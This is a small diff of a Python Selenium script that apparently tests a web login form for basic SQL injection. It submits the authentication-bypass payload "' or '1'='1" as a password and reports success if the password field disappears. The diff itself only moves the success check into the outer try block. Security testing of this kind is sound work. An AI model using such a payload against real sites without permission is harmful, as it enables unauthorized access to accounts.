@@ -46,12 +46,14 @@ try:
 	uname_element.send_keys("admin")
 	passwd_element.send_keys("' or '1'='1")
 	passwd_element.send_keys(Keys.RETURN)
+
+	try:
+		driver.find_element(By.XPATH, "//input[@type='password']")
+	except NoSuchElementException:
+		print("!!!!!!!!!!!!!!!!!!!!!!!!!!!Basic SQL Injection successfully executed!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
+
 except NoSuchElementException:
 	print("Number of password elements: 0")
-try:
-	driver.find_element(By.XPATH, "//input[@type='password']")
-except NoSuchElementException:
-	print("!!!!!!!!!!!!!!!!!!!!!!!!!!!Basic SQL Injection successfully executed!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
 print("Basic SQL Injection tests completed. Check the report for more detailed analysis")
 print(" ")
 
